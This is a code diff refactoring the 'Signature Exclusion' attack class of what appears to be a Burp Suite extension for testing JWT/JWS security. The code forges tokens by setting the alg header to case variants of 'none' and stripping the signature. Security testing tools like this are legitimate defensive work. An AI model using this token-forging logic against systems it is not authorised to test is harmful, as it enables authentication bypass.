@@ -16,15 +16,16 @@
  * this program; if not, write to the Free Software Foundation, Inc., 51
  * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
  */
-package eu.dety.burp.joseph.attacks;
+package eu.dety.burp.joseph.attacks.SignatureExclusion;
 
 import burp.*;
+import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
+import eu.dety.burp.joseph.attacks.IAttackInfo;
+import eu.dety.burp.joseph.attacks.SignatureExclusion.SignatureExclusion;
 import eu.dety.burp.joseph.utilities.Decoder;
 
 import javax.swing.*;
-import java.util.Arrays;
-import java.util.HashMap;
-import java.util.List;
+import java.util.*;
 
 /**
  * Signature Exclusion Attack Info
@@ -43,20 +44,39 @@ public class SignatureExclusionInfo implements IAttackInfo {
 
     // Unique identifier for the attack class
     private static final String id = "signature_exclusion";
+
     // Full name of the attack
     private static final String name = "Signature Exclusion";
+
     // Attack description
     private static final String description = "<html>The <em>Signature Exclusion</em> attack tries to get the token mistakenly verified " +
             "by using the <em>None</em> algorithm and removing the signature.<br/>" +
             "In order to perform filter evasion, different capitalization is used as algorithm value.</html>";
+
     // List of types this attack is suitable for
     private static final List<String> suitableTypes = Arrays.asList("jwt", "jws");
-    // Array of "none" algorithm type variations
-    private static final String[] noneAlgVariations = {"none", "None", "NONE", "nOnE"};
-    // Amount of requests needed
-    private static final int amountRequests = noneAlgVariations.length;
 
-    private HashMap<String, byte[]> requests = new HashMap<>();
+    // Hashmap of "none" algorithm type variations
+    private static final HashMap<payloadType, String> noneAlgVariations = new HashMap<payloadType, String>() {{
+        put(payloadType.LOWERCASE, "none");
+        put(payloadType.CAPITALIZED, "None");
+        put(payloadType.UPPERCASE, "NONE");
+        put(payloadType.MIXED, "nOnE");
+    }};
+
+    // Amount of requests needed
+    private static final int amountRequests = noneAlgVariations.size();
+
+    // Types of payload variation
+    private enum payloadType {
+        LOWERCASE,
+        CAPITALIZED,
+        UPPERCASE,
+        MIXED
+    }
+
+    // List of SignatureExclusionsAttackRequest obejcts holding prepared attack requests
+    private List<SignatureExclusionAttackRequest> requests = new ArrayList<>();
 
     @Override
     public SignatureExclusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo, IParameter parameter) throws AttackPreparationFailedException {
@@ -65,14 +85,16 @@ public class SignatureExclusionInfo implements IAttackInfo {
         this.requestResponse = requestResponse;
         this.parameter = parameter;
 
-        for (String noneAlgVariation : noneAlgVariations) {
+        this.requests.clear();
+
+        for (Map.Entry<payloadType, String> noneAlgVariation : noneAlgVariations.entrySet()) {
             try {
                 // Change the "alg" header value for each of the noneAlgVariation entries
                 // and rebuild a valid request
                 byte[] tmpRequest = this.requestResponse.getRequest();
                 String[] tmpComponents = joseDecoder.getComponents(this.parameter.getValue());
                 String tmpDecodedHeader = joseDecoder.getDecoded(tmpComponents[0]);
-                String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation + "\"");
+                String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation.getValue() + "\"");
                 String tmpReplacedEncoded = joseDecoder.getEncoded(tmpReplaced);
                 String[] tmpNewComponents = {tmpReplacedEncoded, tmpComponents[1], ""};
                 String tmpParameterValue = joseDecoder.concatComponents(tmpNewComponents);
@@ -80,7 +102,7 @@ public class SignatureExclusionInfo implements IAttackInfo {
                 IParameter tmpParameter = helpers.buildParameter(this.parameter.getName(), tmpParameterValue, this.parameter.getType());
                 tmpRequest = helpers.updateParameter(tmpRequest, tmpParameter);
 
-                requests.put("Alg: " + noneAlgVariation, tmpRequest);
+                requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal() , noneAlgVariation.getValue()));
             } catch (Exception e) {
                 throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
             }
@@ -135,7 +157,7 @@ public class SignatureExclusionInfo implements IAttackInfo {
     }
 
     @Override
-    public HashMap<String, byte[]> getRequests() {
+    public List<SignatureExclusionAttackRequest> getRequests() {
         return this.requests;
     }
 }
